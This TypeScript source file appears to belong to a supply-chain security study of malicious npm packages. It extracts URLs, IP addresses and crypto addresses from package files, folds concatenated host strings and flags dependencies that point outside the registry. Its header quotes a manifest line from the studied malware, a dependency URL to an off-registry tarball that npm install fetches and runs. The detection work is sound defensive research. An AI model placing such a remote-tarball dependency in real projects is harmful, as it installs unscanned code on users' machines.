// C1 — the one door out.
//
// An attacker reads credentials in a hundred ways and the reachability analysis
// saturates on every one of them: "can this package reach the network" is
// answered `reached` by most of npm, and `require(variable)` makes the rest
// indeterminate. But stolen credentials are worthless where they are. To be
// worth taking they have to LEAVE, and leaving means a destination — a host, an
// address, a bucket. That is a short list, and a short list does not saturate.
//
// The extraction here is deliberately NOT a parse. 10,758 files across the 58
// case tarballs classify as: 4,882 data, 2,459 docs, 1,594 foreign-script, 1,458
// asset, 180 javascript. The JavaScript analysis reaches 1.7% of them. Strings
// reach all of them, including a 15MB V8 bytecode cache where the AWS metadata
// endpoint and the name of a dynamic-import shim both survive compilation intact.
//
// WHAT IT FOUND. Eight packages from one operator declare a dependency that is
// not on npm at all:
//
//   "dependencies": { "ltidisafe": "https://ltidi.storage.googleapis.com/depenconf/ltidisafe-3.7.4.tgz" }
//
// eight different versions of it, one per package, at package version 99.9.1.
// `npm install` fetches and runs that tarball; npm never saw it, never scanned
// it, and cannot take it down. It is the `mutex-forge` structure one step
// further out — the carrier is not a package, it is a URL.
//
// AND WHAT IT DID NOT. No two case operators share a destination. The only hosts
// shared between operators in the whole corpus are cdn.sheetjs.com and
// github.com, both on the control side and both ordinary. The hypothesis that
// two accounts counted separately would turn out to exfiltrate to one place is
// not supported here, so the case arm stays at seven operators.

import { classifyFile, isExecutableKind, type FileKind } from './file-kind.js'

// Read as latin1, never utf8. A byte-preserving decode finds a hostname sitting
// in a V8 bytecode cache or an ELF section; a utf8 decode replaces every invalid
// sequence and can destroy the very string being looked for.
export function textOf(data: Buffer): string {
  return data.toString('latin1')
}

const URL_RE = /https?:\/\/[A-Za-z0-9._~:/?#[\]@!$&'()*+,;=%-]{4,300}/g
const IPV4_RE = /\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b/g
// 0x + 40 hex is an Ethereum-family address; 0x + 64 hex is a Sui/Aptos object
// or a hash. Both are reported and neither is asserted to be an address: a
// 64-hex string is also what a sha256 looks like, which is why the kind is named
// `hex64` rather than `sui`.
const HEX40_RE = /\b0x[a-fA-F0-9]{40}\b/g
const HEX64_RE = /\b0x[a-fA-F0-9]{64}\b/g
const BTC_RE = /\b(?:bc1[ac-hj-np-z02-9]{11,71}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b/g

export type DestinationKind = 'url' | 'ipv4' | 'hex40' | 'hex64' | 'btc'

export interface Destination {
  kind: DestinationKind
  value: string
  // The host, for a url. Null for everything else and for a url that will not
  // parse, which is itself worth keeping: a malformed URL in a payload is still
  // a destination someone meant to reach.
  host: string | null
  // Where it was found, so a hit in a README can be told from a hit in the
  // bytecode that runs.
  file: string
  fileKind: FileKind
  executable: boolean
}

// Hosts that are infrastructure rather than destinations. Not a safelist for
// scoring — nothing here scores — but the denominator of "how many destinations
// does this package have" is meaningless if every package that ships a
// package-lock counts registry.npmjs.org as one.
//
// Kept short and literal. A regex over "anything ending in .github.io" would
// quietly absorb a payload host on github.io, which is a real hosting choice.
export const INFRASTRUCTURE_HOSTS: ReadonlySet<string> = new Set([
  'registry.npmjs.org', 'www.npmjs.com', 'npmjs.com', 'npmjs.org',
  'github.com', 'www.github.com', 'raw.githubusercontent.com', 'api.github.com',
  'gitlab.com', 'bitbucket.org',
  'www.w3.org', 'www.apache.org', 'opensource.org', 'creativecommons.org',
  'schema.org', 'json-schema.org', 'spdx.org', 'unlicense.org',
  'nodejs.org', 'developer.mozilla.org', 'tc39.es', 'ecma-international.org',
  'localhost', '127.0.0.1', '0.0.0.0', 'example.com', 'www.example.com',
])

export function isInfrastructure(host: string | null): boolean {
  return host !== null && INFRASTRUCTURE_HOSTS.has(host.toLowerCase())
}

export function hostOf(url: string): string | null {
  try {
    return new URL(url).host.toLowerCase()
  } catch {
    return null
  }
}

// Every destination in one file. Trailing punctuation is trimmed from URLs
// because a URL inside prose or inside a string literal almost always ends
// against a quote, a comma or a bracket, and `https://host/path",` is a
// different string from `https://host/path`.
export function destinationsIn(file: string, data: Buffer): Destination[] {
  const kind = classifyFile(file, data.subarray(0, 512)).kind
  const executable = isExecutableKind(kind)
  const text = textOf(data)
  const out: Destination[] = []

  const push = (k: DestinationKind, value: string): void => {
    out.push({
      kind: k,
      value,
      host: k === 'url' ? hostOf(value) : null,
      file,
      fileKind: kind,
      executable,
    })
  }

  for (const m of text.match(URL_RE) ?? []) push('url', m.replace(/[.,;:)'"\]}>]+$/, ''))
  for (const m of text.match(IPV4_RE) ?? []) push('ipv4', m)
  for (const m of text.match(HEX64_RE) ?? []) push('hex64', m)
  // 40-hex after 64-hex, and the 64s removed first, so a 64-character string
  // does not also report its first 40 characters as an Ethereum address.
  for (const m of text.replace(HEX64_RE, ' ').match(HEX40_RE) ?? []) push('hex40', m)
  for (const m of text.match(BTC_RE) ?? []) push('btc', m)

  return out
}

// ---------------------------------------------------------------------------
// Hosts assembled at runtime
// ---------------------------------------------------------------------------

// A host built by concatenation, folded where the pieces are all literal.
//
// `"htt" + "ps://" + h + ".example.com"` does not match the URL regex and is
// exactly what an author writes to keep it from matching. Folding only handles
// the case where every operand is a string literal — the moment one is a
// variable the result is unknowable without executing, and this returns the
// partial with `complete: false` rather than a guess.
//
// This is a text-level fold, not an AST one, and it is bounded: it looks at
// adjacent quoted literals joined by `+`, which is the shape that appears in
// minified output. It will miss a host assembled through an array join or a
// character-code loop, and those are recorded as unresolvable rather than as
// absent.
export interface FoldedHost {
  folded: string
  complete: boolean
  file: string
}

const CONCAT_RE = /(?:"(?:[^"\\\n]|\\.){0,80}"|'(?:[^'\\\n]|\\.){0,80}')(?:\s*\+\s*(?:"(?:[^"\\\n]|\\.){0,80}"|'(?:[^'\\\n]|\\.){0,80}'|[A-Za-z_$][\w$]{0,40}))+/g

export function foldedHostsIn(file: string, data: Buffer): FoldedHost[] {
  const text = textOf(data)
  const out: FoldedHost[] = []

  for (const expression of text.match(CONCAT_RE) ?? []) {
    const parts = expression.split(/\s*\+\s*/)
    let folded = ''
    let complete = true
    for (const part of parts) {
      const literal = /^["'](.*)["']$/s.exec(part)
      if (literal) folded += literal[1]!
      else { complete = false; folded += '…' }
    }
    // Only worth reporting when the result looks like it was going somewhere.
    if (/https?:\/\/|\.[a-z]{2,24}\//i.test(folded) || /^[a-z0-9.-]+\.[a-z]{2,24}$/i.test(folded)) {
      out.push({ folded, complete, file })
    }
  }
  return out
}

// ---------------------------------------------------------------------------
// Dependencies that are not on the registry
// ---------------------------------------------------------------------------

// The strongest thing C1 found, and it needs no string extraction at all — it is
// in the manifest.
//
// A dependency specifier that is a URL, a git remote or a local path is code npm
// does not host. `npm install` still fetches it and still runs its install
// scripts. It cannot be scanned by the registry, cannot be taken down by the
// registry, and does not appear in any downstream count of what a package
// depends on.
//
// `file:` is included even though it is local: a `file:` dependency inside a
// PUBLISHED tarball resolves against the installing machine, and the difference
// between that and a monorepo link is the publish.
const NON_REGISTRY_RE = /^(https?:|git\+|git:|ssh:|file:|github:|gitlab:|bitbucket:)/i
const SHORTHAND_RE = /^[\w.-]+\/[\w.-]+(#|$)/

export function isNonRegistrySpecifier(spec: string): boolean {
  return NON_REGISTRY_RE.test(spec) || SHORTHAND_RE.test(spec)
}

export interface NonRegistryDependency {
  name: string
  specifier: string
  host: string | null
}

export function nonRegistryDependencies(
  dependencies: Record<string, string> | undefined
): NonRegistryDependency[] {
  const out: NonRegistryDependency[] = []
  for (const [name, spec] of Object.entries(dependencies ?? {})) {
    if (typeof spec !== 'string' || !isNonRegistrySpecifier(spec)) continue
    out.push({ name, specifier: spec, host: hostOf(spec) })
  }
  return out
}

// The dependency-capture rule reads `Object.keys(dependencies)` and looks each
// name up on the registry. For `{"ltidisafe": "https://…/ltidisafe-3.7.4.tgz"}`
// that lookup asks npm about a package called `ltidisafe`, which is not what the
// manifest points at — so the rule that exists to follow the carrier would have
// followed nothing. Named here rather than fixed silently: the fix belongs in
// dependency-capture.ts and changes what gets captured, which is a decision.
export function capturableByName(dependencies: Record<string, string> | undefined): string[] {
  return Object.entries(dependencies ?? {})
    .filter(([, spec]) => typeof spec === 'string' && !isNonRegistrySpecifier(spec))
    .map(([name]) => name)
}

// ---------------------------------------------------------------------------
// A package's destination profile
// ---------------------------------------------------------------------------

export interface DestinationProfile {
  package: string
  version: string
  filesRead: number
  // Files whose bytes were read but whose CONTENT no analysis here can
  // interpret. Strings still come out of them, which is the point — but a
  // destination absent from a native binary is not a destination that is not
  // there, and the count says how much of the package is in that state.
  opaqueFiles: number
  bytesRead: number

  destinations: Destination[]
  foldedHosts: FoldedHost[]
  nonRegistryDependencies: NonRegistryDependency[]

  // Distinct hosts, infrastructure removed. The headline count.
  hosts: string[]
  hostsInExecutableFiles: string[]
}

export function profileOf(input: {
  package: string
  version: string
  files: Array<{ name: string; data: Buffer }>
  dependencies?: Record<string, string>
  maxFileBytes?: number
}): DestinationProfile {
  const maxFileBytes = input.maxFileBytes ?? 20 * 1024 * 1024
  const destinations: Destination[] = []
  const foldedHosts: FoldedHost[] = []
  let opaqueFiles = 0
  let bytesRead = 0

  for (const file of input.files) {
    if (file.data.length > maxFileBytes) { opaqueFiles += 1; continue }
    bytesRead += file.data.length
    const kind = classifyFile(file.name, file.data.subarray(0, 512)).kind
    if (kind === 'native' || kind === 'wasm' || kind === 'bytecode') opaqueFiles += 1
    destinations.push(...destinationsIn(file.name, file.data))
    if (kind === 'javascript' || kind === 'foreign-script') {
      foldedHosts.push(...foldedHostsIn(file.name, file.data))
    }
  }

  const hosts = new Set<string>()
  const inExecutable = new Set<string>()
  for (const d of destinations) {
    if (d.kind !== 'url' || d.host === null || isInfrastructure(d.host)) continue
    hosts.add(d.host)
    if (d.executable) inExecutable.add(d.host)
  }

  return {
    package: input.package,
    version: input.version,
    filesRead: input.files.length,
    opaqueFiles,
    bytesRead,
    destinations,
    foldedHosts,
    nonRegistryDependencies: nonRegistryDependencies(input.dependencies),
    hosts: [...hosts].sort(),
    hostsInExecutableFiles: [...inExecutable].sort(),
  }
}

// ---------------------------------------------------------------------------
// Over the corpus
// ---------------------------------------------------------------------------

export interface DestinationComparison {
  caseCaptures: number
  controlCaptures: number
  caseOperators: number
  controlOperators: number

  // Hosts seen on the case side, and how many CONTROL packages also mention
  // them. The second number is what decides whether a host is a destination or
  // a fact about the ecosystem — a host in one case package and eight thousand
  // control packages is a CDN.
  caseHosts: Array<{ host: string; casePackages: number; controlPackages: number }>

  // The non-registry endpoint, at both units. Reported at the operator unit
  // because that is the primary one, and at the capture unit because the gap
  // between them is the whole lesson of the previous passes.
  nonRegistry: {
    caseCaptures: number
    controlCaptures: number
    caseOperators: number
    controlOperators: number
    caseHosts: Array<{ host: string; operator: string; packages: number }>
  }

  // C2. Every host reached by more than one operator, whichever arm they are in.
  sharedAcrossOperators: Array<{ host: string; operators: string[] }>

  // What could not be read, so an absent destination is not read as a clean one.
  opaqueFiles: number
  filesRead: number
}

export function compareDestinations(input: {
  cases: Array<{ profile: DestinationProfile; operator: string }>
  controls: Array<{ profile: DestinationProfile; operator: string }>
}): DestinationComparison {
  // Counted over distinct PACKAGE NAMES, not over captures. 36 of the 58 case
  // captures are @siwatfa/yorn, so a per-capture count reports that operator's
  // release loop as 36 packages agreeing with each other — the same error the
  // capture unit makes everywhere else in this project.
  const byPackage = (side: Array<{ profile: DestinationProfile }>): Map<string, Set<string>> => {
    const out = new Map<string, Set<string>>()
    for (const c of side) for (const h of c.profile.hosts) {
      const at = out.get(h) ?? new Set<string>()
      at.add(c.profile.package)
      out.set(h, at)
    }
    return out
  }
  const controlHosts = byPackage(input.controls)
  const caseHosts = byPackage(input.cases)

  const operatorsByHost = new Map<string, Set<string>>()
  for (const side of [input.cases, input.controls]) {
    for (const m of side) for (const h of m.profile.hosts) {
      const at = operatorsByHost.get(h) ?? new Set<string>()
      at.add(m.operator)
      operatorsByHost.set(h, at)
    }
  }

  const hit = (m: { profile: DestinationProfile }): boolean =>
    m.profile.nonRegistryDependencies.length > 0
  const operatorsWith = (side: Array<{ profile: DestinationProfile; operator: string }>): Set<string> => {
    const out = new Set<string>()
    for (const m of side) if (hit(m)) out.add(m.operator)
    return out
  }

  const caseNonRegistryHosts: Array<{ host: string; operator: string; packages: number }> = []
  const seen = new Map<string, { operator: string; packages: Set<string> }>()
  for (const c of input.cases) for (const d of c.profile.nonRegistryDependencies) {
    if (d.host === null) continue
    const at = seen.get(d.host) ?? { operator: c.operator, packages: new Set<string>() }
    at.packages.add(c.profile.package)
    seen.set(d.host, at)
  }
  for (const [host, at] of seen) {
    caseNonRegistryHosts.push({ host, operator: at.operator, packages: at.packages.size })
  }

  return {
    caseCaptures: input.cases.length,
    controlCaptures: input.controls.length,
    caseOperators: new Set(input.cases.map(c => c.operator)).size,
    controlOperators: new Set(input.controls.map(c => c.operator)).size,
    caseHosts: [...caseHosts.entries()]
      .map(([host, packages]) => ({
        host,
        casePackages: packages.size,
        controlPackages: controlHosts.get(host)?.size ?? 0,
      }))
      .sort((a, b) => b.casePackages - a.casePackages || a.controlPackages - b.controlPackages),
    nonRegistry: {
      caseCaptures: input.cases.filter(hit).length,
      controlCaptures: input.controls.filter(hit).length,
      caseOperators: operatorsWith(input.cases).size,
      controlOperators: operatorsWith(input.controls).size,
      caseHosts: caseNonRegistryHosts.sort((a, b) => b.packages - a.packages),
    },
    sharedAcrossOperators: [...operatorsByHost.entries()]
      .filter(([, ops]) => ops.size > 1)
      .map(([host, ops]) => ({ host, operators: [...ops].sort() }))
      .sort((a, b) => b.operators.length - a.operators.length),
    opaqueFiles:
      input.cases.reduce((n, c) => n + c.profile.opaqueFiles, 0) +
      input.controls.reduce((n, c) => n + c.profile.opaqueFiles, 0),
    filesRead:
      input.cases.reduce((n, c) => n + c.profile.filesRead, 0) +
      input.controls.reduce((n, c) => n + c.profile.filesRead, 0),
  }
}
